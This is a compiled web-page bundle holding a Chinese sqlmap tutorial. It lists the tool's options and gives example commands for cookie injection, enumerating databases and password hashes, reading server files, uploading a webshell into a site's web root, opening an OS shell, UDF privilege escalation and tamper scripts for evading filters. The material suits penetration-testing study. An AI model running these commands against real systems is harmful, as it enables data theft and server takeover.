(window.webpackJsonp=window.webpackJsonp||[]).push([[70],{746:function(s,t,a){"use strict";a.r(t);var e=a(103),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"sqlmap简介"}},[s._v("sqlmap简介 "),a("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap简介"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("当给sqlmap一个URL，它会干些什么？")])]),s._v(" "),a("blockquote",[a("p",[s._v("1）判断可注入的参数")]),s._v(" "),a("p",[s._v("2）判断可以用那种SQL注入技术来注入")]),s._v(" "),a("p",[s._v("3）识别出哪种数据库")]),s._v(" "),a("p",[s._v("4）根据用户选择，读取哪些数据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("--purge\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#清除历史缓存")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"选项摘要"}},[s._v("选项摘要 "),a("a",{staticClass:"header-anchor",attrs:{href:"#选项摘要"}},[s._v("#")])]),s._v(" "),a("h4",{attrs:{id:"输出信息的详细程度"}},[a("strong",[s._v("输出信息的详细程度")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#输出信息的详细程度"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("-v\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#共7个级别(0~6)，默认为1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#可以用 -vv 代替 -v 2，推荐使用这种方法")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("ul",[a("li",[a("strong",[s._v("0")]),s._v("：只输出 Python 出错回溯信息，错误和关键信息")]),s._v(" "),a("li",[a("strong",[s._v("1")]),s._v("：增加输出普通信息和警告信息")]),s._v(" "),a("li",[a("strong",[s._v("2")]),s._v("：增加输出调试信息")]),s._v(" "),a("li",[a("strong",[s._v("3")]),s._v("：增加输出已注入的 payloads")]),s._v(" "),a("li",[a("strong",[s._v("4")]),s._v("：增加输出 HTTP 请求")]),s._v(" "),a("li",[a("strong",[s._v("5")]),s._v("：增加输出 HTTP 响应头")]),s._v(" "),a("li",[a("strong",[s._v("6")]),s._v("：增加输出 HTTP 响应内容")])]),s._v(" "),a("h4",{attrs:{id:"目标"}},[a("strong",[s._v("目标")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#目标"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("-d\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#直连数据库，"mysql://root:root@192.168.0.8:3306/testdb"')]),s._v("\n-u URL\n-l\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#从Burp代理日志文件中解析目标地址")]),s._v("\n-m\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#从文本文件中批量获取目标")]),s._v("\n-r\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#从文件中读取 HTTP 请求")]),s._v("\n\n--purge\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#清除历史缓存")]),s._v("\n--flush-session\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#清除上次扫描的缓存")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h4",{attrs:{id:"请求"}},[a("strong",[s._v("请求")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#请求"}},[s._v("#")])]),s._v(" "),a("p",[s._v("指定连接目标地址的方式")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("--method"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("METHOD\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#强制使用提供的 HTTP 方法（例如：PUT）")]),s._v("\n--data"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("DATA\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#使用 POST 发送数据串；--data="id=1&user=admin"')]),s._v("\n--param-del"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('";"')]),s._v("\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#使用参数分隔符，--data="id=1;user=admin"')]),s._v("\n--cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("COOKIE\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#指定 HTTP Cookie ，--cookie "id=11" --level 2')]),s._v("\n--drop-set-cookie\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#忽略 HTTP 响应中的 Set-Cookie 参数")]),s._v("\n--user-agent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("AGENT\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定 HTTP User-Agent")]),s._v("\n--random-agent\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个")]),s._v("\n--referer"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REFERER\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定 HTTP Referer")]),s._v("\n-H HEADER\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）')]),s._v("\n--headers"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("HEADERS\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#设置额外的 HTTP 头参数,必须以换行符分隔（例如："Accept-Language: fr\\nETag: 123"）')]),s._v("\n--delay"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置每个 HTTP 请求的延迟秒数")]),s._v("\n--safe-freq"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("SAFE\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#每访问两次给定的合法 URL 才发送一次测试请求")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("h4",{attrs:{id:"注入"}},[a("strong",[s._v("注入")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#注入"}},[s._v("#")])]),s._v(" "),a("p",[s._v("以下选项用于指定要测试的参数")]),s._v(" "),a("p",[s._v("提供自定义注入 payloads 和篡改参数的脚本")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("-p TESTPARAMETER\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定需要测试的参数")]),s._v("\n--skip"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("SKIP\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定要跳过的参数")]),s._v("\n--dbms"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("DBMS\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定 DBMS 类型（例如：MySQL）")]),s._v("\n--os"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("OS\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定 DBMS 服务器的操作系统类型")]),s._v("\n--prefix"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("PREFIX\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#注入 payload 的前缀字符串")]),s._v("\n--suffix"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("SUFFIX\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#注入 payload 的后缀字符串")]),s._v("\n--tamper"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("TAMPER\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用给定脚本修改注入数据")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("h4",{attrs:{id:"检测"}},[a("strong",[s._v("检测")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#检测"}},[s._v("#")])]),s._v(" "),a("p",[s._v("sqlmap 使用的 payloads 直接从文本文件 "),a("code",[s._v("xml/payloads.xml")]),s._v(" 中载入。")]),s._v(" "),a("p",[s._v("根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，")]),s._v(" "),a("p",[s._v("你可以选择自己修改指定的 payload 用于检测。")]),s._v(" "),a("p",[a("strong",[s._v("level有5级，越高检测越全，默认为 1")])]),s._v(" "),a("blockquote",[a("p",[s._v("--level 1\t检测Get和Post")]),s._v(" "),a("p",[s._v("--level 2\t检测HTTP Cookie")]),s._v(" "),a("p",[s._v("--level 3\t检测User-Agent和Referer")]),s._v(" "),a("p",[s._v("--level 4\t检测")]),s._v(" "),a("p",[s._v("--level 5\t检测 HOST 头")])]),s._v(" "),a("p",[a("strong",[s._v("risk有3级，级别越高风险越大，默认为1")])]),s._v(" "),a("blockquote",[a("p",[s._v("--risk 2\t 会在默认的检测上添加大量时间型盲注语句测试")]),s._v(" "),a("p",[s._v("--risk 3\t 会在原基础上添加"),a("code",[s._v("OR")]),s._v(" 类型的布尔型盲注 ，可能会update导致修改数据库")])]),s._v(" "),a("h4",{attrs:{id:"技术"}},[a("strong",[s._v("技术")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#技术"}},[s._v("#")])]),s._v(" "),a("p",[s._v("以下选项用于调整特定 SQL 注入技术的测试方法")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("--technique"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("TECH\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#使用的 SQL 注入技术（默认为“BEUSTQ”)")]),s._v("\nB: Boolean-based blind SQL injection（布尔型盲注）\nE: Error-based SQL injection（报错型注入）\nU: UNION query SQL injection（联合查询注入）\nS: Stacked queries SQL injection（堆查询注入）\nT: Time-based blind SQL injection（时间型盲注）\nQ: inline Query injection（内联查询注入）\n\n--time-sec"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("TIMESEC  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置延时注入的时间（默认为 5）")]),s._v("\n--second-order"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("S"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("h4",{attrs:{id:"枚举"}},[a("strong",[s._v("枚举")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#枚举"}},[s._v("#")])]),s._v(" "),a("p",[s._v("以下选项用于获取数据库的信息，结构和数据表中的数据。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("-a, --all          "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取所有信息、数据")]),s._v("\n-b, --banner        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取 DBMS banner,返回数据库的版本号")]),s._v("\n--current-user\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取 DBMS 当前用户")]),s._v("\n--current-db\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取 DBMS 当前数据库")]),s._v("\n--hostname\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取 DBMS 服务器的主机名")]),s._v("\n--is-dba\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#探测 DBMS 当前用户是否为 DBA（数据库管理员）")]),s._v("\n--users\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有用户")]),s._v("\n--passwords\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有用户的密码哈希")]),s._v("\n--privileges\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有用户特权级")]),s._v("\n--roles\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有用户角色")]),s._v("\n\n--dbs\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有数据库")]),s._v("\n--tables\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 数据库中的所有表")]),s._v("\n--columns\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 表中的所有列")]),s._v("\n--schema\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#枚举出 DBMS 所有模式")]),s._v("\n--count\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取数据表数目")]),s._v("\n--dump\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#导出 DBMS 数据库表项")]),s._v("\n--stop "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v("\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#只取前10行数据")]),s._v("\n    \n-D DB\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定要枚举的 DBMS 数据库")]),s._v("\n-T TBL\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定要枚举的 DBMS 数据表")]),s._v("\n-C COL\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定要枚举的 DBMS 数据列")]),s._v("\n    \n--sql-query"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("QUERY\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#指定要执行的 SQL 语句")]),s._v("\n--sql-shell\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#调出交互式 SQL shell")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br")])]),a("h1",{attrs:{id:"用例"}},[s._v("用例 "),a("a",{staticClass:"header-anchor",attrs:{href:"#用例"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("从文件读取HTTP请求，GET和POST都可以")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -r "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"burp.txt"')]),s._v(" -p "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"username"')]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#-p 指定存在注入的参数")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("Cookie注入")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://www.vuln.com"')]),s._v(" --cookie "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"id=11"')]),s._v(" --level "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("当防火墙，对请求速度做了限制")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://www.vuln.com/post.php?id=1"')]),s._v(" --delay"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#在每个HTTP请求之间的延迟10秒")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"伪静态注入"}},[s._v("伪静态注入 "),a("a",{staticClass:"header-anchor",attrs:{href:"#伪静态注入"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqpmap  -u http://victim.com/id/666*.html --dbs  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#在html扩展名前加个'*'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"访问文件系统"}},[s._v("访问文件系统 "),a("a",{staticClass:"header-anchor",attrs:{href:"#访问文件系统"}},[s._v("#")])]),s._v(" "),a("p",[s._v("仅对MySQL、MSSQL、PosgreSQL有效")]),s._v(" "),a("p",[s._v("数据库用户有读写权限，有目录读写文件权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u url --is-dba\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看是否dba权限,必须为root权限")]),s._v("\n\nsqlmap -u url --file-read "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:/Windows/win.ini"')]),s._v("\t\t\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#读取文件")]),s._v("\n\nsqlmap -u url --file-write"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("D:/shell.php --file-dest"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("C:/www/shell.php\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#上传文件 (本地木马路径:目标网站目录)")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"接管操作系统"}},[s._v("接管操作系统 "),a("a",{staticClass:"header-anchor",attrs:{href:"#接管操作系统"}},[s._v("#")])]),s._v(" "),a("p",[s._v("仅对MySQL、MSSQL、PosgreSQL有效")]),s._v(" "),a("p",[s._v("数据库用户有读写权限，有目录读写文件权限")]),s._v(" "),a("p",[s._v("sqlmap 能够在"),a("strong",[s._v("数据库所在服务器的操作系统上运行任意的命令")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap -u "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"URL"')]),s._v(" --os-shell\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取系统交互shell或--os-cmd=id执行系统命令")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("a",{attrs:{href:"https://blog.sari3l.com/posts/8dea0d95/",target:"_blank",rel:"noopener noreferrer"}},[s._v("原理"),a("OutboundLink")],1),s._v("就是上传一个upload木马后，再上传一个cmd shell；")]),s._v(" "),a("p",[s._v("当 --os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。")]),s._v(" "),a("blockquote",[a("p",[s._v("在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数")]),s._v(" "),a("p",[s._v("分别为 "),a("code",[s._v("sys_exec()")]),s._v(" 和 "),a("code",[s._v("sys_eval()")]),s._v(" 的共享库（二进制文件）")]),s._v(" "),a("p",[s._v("然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。")]),s._v(" "),a("p",[s._v("在 Microsoft SQL Server 中，sqlmap 会利用 "),a("code",[s._v("xp_cmdshell")]),s._v(" 存储过程：")]),s._v(" "),a("p",[s._v("如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；")]),s._v(" "),a("p",[s._v("如果该存储过程不存在，sqlmap 则会重新创建它。")]),s._v(" "),a("p",[s._v("当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。")]),s._v(" "),a("p",[s._v("相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。")]),s._v(" "),a("p",[s._v("如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，")]),s._v(" "),a("p",[s._v("假如后端 DBMS 和 Web 服务器在同一台服务器上，")]),s._v(" "),a("p",[s._v("则仍可以通过利用 "),a("code",[s._v("SELECT")]),s._v(" 语句中的 "),a("code",[s._v("INTO OUTFILE")]),s._v("，在 根目录可写目录中写shell")])]),s._v(" "),a("h2",{attrs:{id:"udf提权"}},[s._v("UDF提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#udf提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("使用选项 "),a("code",[s._v("--udf-inject")]),s._v(" 并按照说明进行操作即可；")]),s._v(" "),a("p",[s._v("如果需要，也可以使用 "),a("code",[s._v("--shared-lib")]),s._v(" 选项通过命令行指定共享库的本地文件系统路径。")]),s._v(" "),a("p",[s._v("否则 sqlmap 会在运行时向你询问路径。")]),s._v(" "),a("p",[s._v("此功能仅对 MySQL 或 PostgreSQL 有用。")]),s._v(" "),a("h1",{attrs:{id:"tamper脚本"}},[s._v("tamper脚本 "),a("a",{staticClass:"header-anchor",attrs:{href:"#tamper脚本"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("use age：sqlmap.py --tamper"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"模块名.py"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("apostrophemask\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将单引号 url 编码")]),s._v("\napostrophenullencode\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将单引号替换为宽字节 unicode 字符")]),s._v("\nbase64encode\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#base64 编码")]),s._v("\nbetween\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况")]),s._v("\nbluecoat\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况")]),s._v("\ncharencode\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用 url 编码一次你的 payload")]),s._v("\ncharunicodeencode\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用 unicode 编码 payload ，只编码非编码字符")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("a",{attrs:{href:"https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("自定义tamper"),a("OutboundLink")],1)])])}),[],!1,null,null,null);t.default=n.exports}}]);